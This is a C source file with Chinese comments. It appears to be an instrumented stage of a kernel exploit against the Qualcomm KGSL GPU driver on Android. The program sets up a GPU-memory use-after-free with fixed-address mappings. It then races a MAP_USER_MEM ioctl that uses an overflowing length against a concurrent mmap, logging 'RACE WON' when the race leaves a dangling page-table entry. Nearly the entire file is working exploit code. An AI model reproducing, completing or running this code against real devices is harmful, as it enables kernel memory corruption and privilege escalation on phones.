/*
 * k3_stage_c2.c — 阶段 C-1 插桩版：每步落盘 + 无缓冲输出 + 看门狗
 *
 * 与 k3_stage_c 的唯一区别是可观测性：
 *   - 每个关键步骤写 /data/local/tmp/stage_c.log（O_APPEND + fsync），
 *     即使随后内核崩溃，也留下"最后完成的步骤"
 *   - 输出走 write(2)，不经 stdio 缓冲
 *   - alarm(60) 看门狗，防止 pthread_join 死等
 *
 * 序列与判据不变：竞速命中 = OVERLAP mmap 返回 ENODEV(19)。
 * 用法: k3_stage_c2 [delay_us]
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/stage_c.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

static int fd = -1;
static int logfd = -1;

static double now_ms(void);

static void lg(const char *fmt, ...)
{
	char buf[256];
	char line[320];
	va_list ap;
	int n;
	double t = now_ms();

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.3f] %s\n", t, buf);
	if (write(1, line, n) < 0) { /* ignore */ }
	if (logfd >= 0) {
		if (write(logfd, line, n) < 0) { /* ignore */ }
		fsync(logfd);
	}
}

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void on_alarm(int sig)
{
	(void)sig;
	lg("WATCHDOG: 60s 超时，疑似阻塞在 ioctl/join，强制退出");
	_exit(9);
}

struct race_state {
	volatile int ready;
	volatile int started;
	volatile long result;
	volatile int saved_errno;
	uint64_t bogus_start;
	uint64_t wrap_size;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");

	lg("racer: 进入 MAP_USER_MEM(hostptr=0x%llx, len=0x%llx)",
	   (unsigned long long)rs->bogus_start,
	   (unsigned long long)rs->wrap_size);
	rs->started = 1;
	__sync_synchronize();

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.gpuaddr = 0;
	req.len = rs->wrap_size;
	req.offset = 0;
	req.hostptr = (unsigned long)rs->bogus_start;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	lg("racer: ioctl 返回 ret=%ld errno=%d (%s)", rs->result,
	   rs->saved_errno, strerror(rs->saved_errno));
	__sync_synchronize();
	return NULL;
}

static int obj_alloc(const char *tag, uint64_t size, unsigned int *id,
		     uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("%s: ALLOC(0x%llx) FAIL errno=%d (%s)", tag,
		   (unsigned long long)size, errno, strerror(errno));
		return -1;
	}
	*id = al.id;
	*ms = al.mmapsize;
	lg("%s: ALLOC OK id=%u mmapsize=0x%llx", tag, al.id,
	   (unsigned long long)al.mmapsize);
	return 0;
}

int main(int argc, char **argv)
{
	int delay_us = (argc > 1) ? atoi(argv[1]) : 200;
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p, *bogus_vma, *ph_vma;
	struct race_state rs;
	pthread_t th;
	size_t k;
	int mmap_errno = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	signal(SIGALRM, on_alarm);
	alarm(60);

	lg("=== stage_c2 start pid=%d delay_us=%d ===", getpid(), delay_us);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	lg("open /dev/kgsl-3d0 OK fd=%d", fd);

	if (obj_alloc("UAF", UAF_SIZE, &uaf_id, &uaf_ms))
		return 1;
	if (obj_alloc("OVERLAP", OVERLAP_SIZE, &ov_id, &ov_ms))
		return 1;

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	lg("UAF mmap OK @0x%llx len=0x%llx", (unsigned long long)UAF_START,
	   (unsigned long long)uaf_ms);

	((volatile char *)p)[0] = 0x5a;
	lg("UAF touch first page 完成");
	((volatile char *)p)[uaf_ms - PAGE] = 0x5a;
	lg("UAF touch last page 完成");
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 0x5a;
	lg("UAF touch 抽样完成");

	munmap(p, (size_t)uaf_ms);
	lg("UAF munmap 完成");

	bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
			 PROT_READ | PROT_WRITE,
			 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus_vma == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d (%s)", errno, strerror(errno));
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus_vma)[k * PAGE] = 1;
	lg("BOGUS VMA OK @0x%llx", (unsigned long long)BOGUS_START);

	if (obj_alloc("PLACEHOLDER", PLACEH_SIZE, &ph_id, &ph_ms))
		return 1;
	ph_vma = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		      PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		      (off_t)ph_id << 12);
	if (ph_vma == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d (%s)", errno,
		   strerror(errno));
		return 1;
	}
	((volatile char *)ph_vma)[0] = 1;
	lg("PLACEHOLDER mmap OK @0x%llx", (unsigned long long)PLACEH_START);

	memset(&rs, 0, sizeof(rs));
	rs.bogus_start = BOGUS_START;
	rs.wrap_size = WRAP_SIZE;
	rs.result = -1;
	if (pthread_create(&th, NULL, racer, &rs)) {
		lg("pthread_create FAIL");
		return 1;
	}
	rs.ready = 1;
	__sync_synchronize();
	while (!rs.started)
		__asm__ __volatile__("" ::: "memory");
	lg("racer 已启动，等待 %d us 后主线程 mmap OVERLAP", delay_us);
	if (delay_us > 0)
		usleep(delay_us);

	lg("主线程: 进入 mmap(OVERLAP @0x%llx len=0x%llx)",
	   (unsigned long long)OVERLAP_START, (unsigned long long)ov_ms);
	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)ov_id << 12);
	mmap_errno = errno;
	lg("主线程: mmap 返回 %s errno=%d (%s)",
	   p == MAP_FAILED ? "MAP_FAILED" : "OK", mmap_errno,
	   strerror(mmap_errno));

	pthread_join(th, NULL);
	lg("racer join 完成 ret=%ld errno=%d", rs.result, rs.saved_errno);

	if (p == MAP_FAILED && mmap_errno == ENODEV) {
		lg(">>> RACE WON (ENODEV=19)，立即退出，不触碰悬垂 PTE <<<");
		_exit(0);
	}
	lg("结果: %s (hit 判据为 ENODEV 19)",
	   (p == MAP_FAILED && mmap_errno == ENOMEM) ? "MISS (ENOMEM)" :
						       "OTHER");

	if (p != MAP_FAILED)
		munmap(p, (size_t)ov_ms);
	munmap(ph_vma, (size_t)ph_ms);
	munmap(bogus_vma, PAGE * 3);
	{
		struct kgsl_gpuobj_free fr;
		memset(&fr, 0, sizeof(fr));
		fr.id = ov_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = ph_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = uaf_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	lg("清理完成，退出");
	close(fd);
	return 0;
}
